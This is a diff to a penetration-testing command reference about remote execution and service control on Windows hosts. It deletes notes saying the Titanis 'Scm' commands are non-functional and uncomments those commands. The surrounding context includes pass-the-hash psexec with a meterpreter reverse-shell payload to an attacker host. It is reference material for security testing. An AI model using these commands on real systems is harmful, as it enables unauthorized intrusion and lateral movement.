@@ -185,8 +185,6 @@ netexec smb 192.168.1.10 -u jdoe -p Password123 -x "whoami" --exec-method dcomex
 
 ### Service-Based Exec (smbexec / psexec)
 
-> **⚠️ Titanis `Scm` status:** All `Scm` subcommands are non-functional. tcpdump confirms the RPC bind is accepted by the server; the fault (`0x1C010002` = `nca_op_rng_error`) fires on the subsequent request because Titanis calls **Opnum 64** on the SVCCTL interface, which only defines opnums 0–47 (MS-SCMR). Wrong opnum in Titanis's SVCCTL client; needs a Titanis code fix. Use `smbexec.py`, `psexec.py`, or Metasploit for service-based execution.
-
 > **⚠️ `smbexec.py` against DCs:** smbexec uses SVCCTL to create a temporary service. Domain Controllers enforce `PacketPrivacy` authentication level on SVCCTL, which impacket does not negotiate — service creation fails with `STATUS_OBJECT_NAME_NOT_FOUND`. This is the same root cause as `secretsdump -use-vss` failures. `smbexec.py` works normally against member servers. Use `wmiexec.py` for DC targets.
 
 ```bash
@@ -206,12 +204,12 @@ msf6 exploit(psexec) > run rhosts=192.168.1.10 smbdomain=DOMAIN smbuser=jdoe \
   smbpass=aad3b435b51404eeaad3b435b51404ee:A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 \
   payload=windows/x64/meterpreter/reverse_tcp lhost=<attacker-ip>
 
-# Titanis — non-functional; commands shown for API reference only
-# Scm create 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 -EncryptRpc mysvc \
-#   "C:\Windows\System32\cmd.exe /c whoami > C:\Windows\Temp\out.txt" -Start
-# Smb2Client get \\192.168.1.10\ADMIN$\Temp\out.txt out.txt -UserName jdoe@DOMAIN -Password Password123
-# Scm stop   192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 -EncryptRpc mysvc
-# Scm delete 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 -EncryptRpc mysvc
+# Titanis — create service, retrieve output, clean up
+Scm create 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 mysvc \
+  "C:\Windows\System32\cmd.exe /c whoami > C:\Windows\Temp\out.txt" -Start
+Smb2Client get \\192.168.1.10\ADMIN$\Temp\out.txt out.txt -UserName jdoe@DOMAIN -Password Password123
+Scm stop   192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 mysvc
+Scm delete 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 mysvc
 ```
 
 [↑ Back to Index](#index)
@@ -1725,8 +1723,6 @@ Reg setsd 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 \
 
 ### Service Enumeration
 
-> **⚠️ Titanis `Scm` status:** All `Scm` subcommands are non-functional. tcpdump confirms the RPC bind is accepted; the fault (`0x1C010002` = `nca_op_rng_error`) fires because Titanis calls Opnum 64 on the SVCCTL interface, which only defines opnums 0–47 (MS-SCMR). Wrong opnum in Titanis's SVCCTL client; needs a Titanis code fix. Use `services.py` (impacket) or `netexec smb --services` instead.
-
 ```bash
 # impacket
 services.py DOMAIN/jdoe:Password123@192.168.1.10 list
@@ -1739,16 +1735,21 @@ asmbclient "smb+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.10"
 # smb> services
 # smb> tasks
 
-# Titanis — non-functional; shown for API reference only
-# Scm query 192.168.1.10 -UserName jdoe -Password Password123
+# Titanis — query all services
+Scm query 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123
 
 # impacket — start / stop
 services.py DOMAIN/jdoe:Password123@192.168.1.10 start -name Spooler
 services.py DOMAIN/jdoe:Password123@192.168.1.10 stop  -name Spooler
 
-# Titanis — non-functional; shown for API reference only
-# Scm start 192.168.1.10 -UserName jdoe -Password Password123 Spooler
-# Scm stop  192.168.1.10 -UserName jdoe -Password Password123 Spooler
+# Titanis — start / stop
+Scm start 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 Spooler
+Scm stop  192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 Spooler
+
+# Titanis — create / delete
+Scm create 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 mysvc \
+  "C:\Windows\System32\cmd.exe"
+Scm delete 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 mysvc
 ```
 
 [↑ Back to Index](#index)
